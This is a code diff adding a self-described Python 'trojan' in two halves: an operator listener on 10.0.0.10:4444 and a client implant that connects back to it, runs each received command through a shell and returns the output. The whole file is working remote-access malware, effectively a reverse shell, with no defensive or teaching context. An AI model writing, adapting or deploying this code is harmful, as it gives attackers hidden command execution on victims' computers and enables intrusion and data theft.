@@ -1,0 +1,109 @@
+import socket, time, os
+from sm.sm import clear
+
+clear()
+print("Welcome to the server_client trojan by Pascal Vallaster!")
+print("Loading...")
+time.sleep(3)
+clear()
+
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connection.bind(("10.0.0.10", 4444))
+connection.listen(2)
+client_socket, address = connection.accept()
+print("Connection from ", address, "has been established!")
+
+
+class client:
+    def send_command(self, command):
+        command = bytes(command, "utf-8")
+        client_socket.send(command)
+
+    def get_client_output(self):
+        self.client_response = client_socket.recv(9999)
+        self.client_response = self.client_response.decode("utf-8")
+        self.client_response = str(self.client_response)
+
+
+client_instance = client()
+
+while True:
+    command = input("command: ")
+    if command == "exit":
+        client_socket.close()
+        connection.close()
+        break
+    if command == "cls" or command == "clear":
+        os.system("cls")
+        continue
+
+    client_instance.send_command(command)
+    client_instance.get_client_output()
+    print(client_instance.client_response)
+
+#####################################################################################################
+
+import socket
+import subprocess
+import os
+
+
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connection.connect(("10.0.0.10", 4444))
+
+class server:
+    def get_server_msg(self):
+        self.server_answer = connection.recv(9999)
+        self.server_answer = self.server_answer.decode("utf-8")
+        self.server_answer = str(self.server_answer)
+        self.cCache = ""
+        aCommand = []
+        for element in self.server_answer:
+            if element == " ":
+                aCommand.append(self.cCache)
+                self.cCache = ""
+                continue
+            self.cCache += element
+
+        aCommand.append(self.cCache)
+        self.server_answer = aCommand
+
+    def execute_command(self):
+        if not "cd" in self.server_answer:
+            process = subprocess.Popen(self.server_answer, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+            self.output, self.errors = process.communicate()
+            self.output = self.output.decode("cp1250")
+            self.output = str(self.output)
+        else:
+            len_serrver_asnwer = len(self.server_answer)
+            len_serrver_asnwer -= 1
+            nCounter = 0
+            command = ""
+            for element in self.server_answer:
+                if nCounter == 0:
+                    nCounter += 1
+                    continue
+                else:
+                    command += element
+            if os.path.exists(command):
+                os.chdir(command)
+                self.output = "Successfully changed directory!"
+            else:
+                self.output = "Directory doesn't exists!"
+
+
+    def send_output(self):
+        output = bytes(self.output, "utf-8")
+        connection.send(output)
+
+
+server_instance = server()
+
+while True:
+    try:
+        server_instance.get_server_msg()
+        server_instance.execute_command()
+        server_instance.send_output()
+    except:
+        connection.close()
+        break
